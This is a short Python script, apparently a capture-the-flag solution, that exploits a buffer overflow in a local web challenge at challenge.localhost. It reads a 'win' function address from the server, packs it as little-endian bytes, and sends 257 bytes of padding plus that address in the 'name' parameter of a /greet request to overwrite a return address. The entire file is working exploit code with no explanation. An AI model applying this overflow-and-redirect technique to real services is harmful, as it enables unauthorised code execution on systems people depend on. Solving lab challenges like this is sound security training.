#!/usr/bin/env python

import requests

def get_GET_result(url = 'http://challenge.localhost:80', args = '', print_out = True):
    response = requests.get(url + args)
    if(print_out):
        print(response.text)
    return response.text

# Get a 8-byte string of this format '\xc5\xb1\xc1\xe1\x5d\x7f\x00\x00'
def hexadecimal_string(hex_string):
    if('0x' in hex_string):
        hex_string = hex_string[2:]
    # Convert each pair of hexadecimal characters to integer values
    numbers = [int(hex_string[i:i+2], 16) for i in range(0, len(hex_string), 2)][::-1]
    pad_len = 8 - len(numbers)
    for i in range(pad_len):
        numbers.append(0)
    return ''.join([chr(value) for value in numbers])

def lv_1():
    win_addr_hex   = get_GET_result(url = 'http://challenge.localhost:80/win_address')[:-1]
    win_addr_str = hexadecimal_string(win_addr_hex)
    name = ''
    for i in range(257):
        name = name + 'x'

    get_GET_result(url = 'http://challenge.localhost:80/greet', args = '?name=' + name + win_addr_str)
